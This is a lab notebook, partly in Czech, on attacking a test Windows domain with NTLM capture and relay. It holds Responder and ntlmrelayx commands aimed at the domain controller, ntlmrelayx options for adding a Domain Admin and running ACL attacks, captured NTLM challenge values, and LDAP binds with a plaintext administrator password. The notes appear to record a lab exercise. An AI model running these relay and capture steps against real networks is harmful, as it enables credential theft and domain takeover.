download win10 virtual from:
https://tb.rg-adguard.net/public.php
DHCP - prideluje ip v siti + DNS, mask atd
Responder:
https://github.com/SpiderLabs/Responder.git
ve vmware prenastavit net configuration BRIDGE

netstat -ano | findstr :445
run cmd as admin
taskkill /PID 4 /F

sudo python Responder.py -I ens33

nbtstat #na windows

MDNS - multicast DNS
LLMNR -  Link-Local Multicast Name Resolution
NTLM - NT lan manager
NTM - Network Time Manager

1. SMB Command: Negotiate Protocol
2. Session Setup AndX
- mechToken -- too short
- responsetoken
- NTLMChalange b5:f8:84:d4:95:20:71:58 (8 bytu)
- NTLMProofString 
NTProofStr: f7767292404e180abb7bee2e5c104dd3
- NTLMClientChalange c8:5d:4c:6a:0e:31:ca:f0

File "/home/osboxes/Responder/utils.py", line 130, in SaveToDb

cursor.execute('CREATE TABLE responder (timestamp varchar(32), module varchar(16), type varchar(16), client varchar(32), hostname varchar(32), user varchar(32), cleartext varchar(128), hash varchar(512), fullhash varchar(512))')
OperationalError: table responder already exists


sudoedit /etc/UPower/UPower.conf
IgnoreLid=true

https://github.com/python-ldap/python-ldap.git
shift+insert

nelze spustit:
sudo pip install python-ldap
Modules/errors.h:8: fatal error: lber.h: No such file or directory
reseni:
sudo apt-get install libsasl2-dev python-dev libldap2-dev libssl-dev


LDAP port 389
https://likegeeks.com/linux-ldap-server/
sudo apt-get install slapd
sudo apt-get install ldap-utils
systemctl enable slapd
dappassword
```python
import ldap
l = ldap.initialize("ldap://192.168.133.2")
l.simple_bind_s("PESIK\\Administrator", "Turololo42")

l.search_s("o=My Organisation, c=AU", ldap.SCOPE_SUBTREE, "objectclass=*")

l.simple_bind_s("","")
```
```sh
netstat -a

ldapsearch -h 192.168.133.2 -D "PESIK\\Administrator" -w Turololo42
ldapsearch -h 192.168.133.2 -D "cn=Administrator,dc=pesik,dc=localdomain" -w Turololo42
ldapsearch -x -D 'cn=Administrator@pesik.localdomain' -h 192.168.133.2 -w Turololo42

-W #prompt for bind password
-x #Simple authentication
-h ip
-H URL
-w password

curl ldap://192.168.133.2

sudo apt install openjdk-11-jre-headless default-jre openjdk-8-jre-headless
```
https://www.netiq.com/communities/cool-solutions/cool_tools/gawors-excellent-ldap-browsereditor-v282/

version
windows server 2012 r2

allowing ldap on win server 2012 r2:
https://blogs.msdn.microsoft.com/microsoftrservertigerteam/2017/04/10/step-by-step-guide-to-setup-ldaps-on-windows-server/

AD LDS port: 50000
HERUEKA:
```sh
ldapsearch -h 192.168.133.2:389 -D "PESIK\\Administrator" -w Turololo42
```

adding computer to domain:
https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/deployment/join-a-computer-to-a-domain

```sh
smbclient -L 192.168.133.2 -U Administrator -W PESIK
```

turn off after-sleep login screen
```sh
sudo chmod 777 /etc/default/acpi-support
vim /etc/default/acpi-support
# LOCK_SCREEN=true
```

NTLM relaying in 2017
https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

check smb signing
https://github.com/actuated/check-smb-signing
```sh
sudo ./check-smb-signing.sh --nmap -a 192.168.133.2
```
regedit.exe
http://techgenix.com/windows-smb-signing/
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters
enablesecuritysignitures

LanManWorkstation


look at PowerShell Empire

```nmap
Nmap scan report for 192.168.133.2
Host is up, received user-set (0.0014s latency).
Scanned at 2018-11-09 09:44:05 EST for 90s
Not shown: 981 filtered ports
Reason: 981 no-responses
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 128
88/tcp    open  kerberos-sec     syn-ack ttl 128
135/tcp   open  msrpc            syn-ack ttl 128
139/tcp   open  netbios-ssn      syn-ack ttl 128
389/tcp   open  ldap             syn-ack ttl 128
445/tcp   open  microsoft-ds     syn-ack ttl 128
464/tcp   open  kpasswd5         syn-ack ttl 128
636/tcp   open  ldapssl          syn-ack ttl 128
3268/tcp  open  globalcatLDAP    syn-ack ttl 128
3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
3389/tcp  open  ms-wbt-server    syn-ack ttl 128
49154/tcp open  unknown          syn-ack ttl 128
49155/tcp open  unknown          syn-ack ttl 128
49156/tcp open  unknown          syn-ack ttl 128
49158/tcp open  unknown          syn-ack ttl 128
49159/tcp open  unknown          syn-ack ttl 128
49167/tcp open  unknown          syn-ack ttl 128
50000/tcp open  ibm-db2          syn-ack ttl 128
50001/tcp open  unknown          syn-ack ttl 128
```
##ntlmrelayx.py
LDAP client options:
  --no-dump             Do not attempt to dump LDAP information
  --no-da               Do not attempt to add a Domain Admin
  --no-acl              Disable ACL attacks
  --escalate-user ESCALATE_USER
                        Escalate privileges of this user instead of creating a
                        new one
```sh
sudo ./impacket/examples/ntlmrelayx.py -t ldap://192.168.133.2 -smb2support --no-dump --no-acl
```

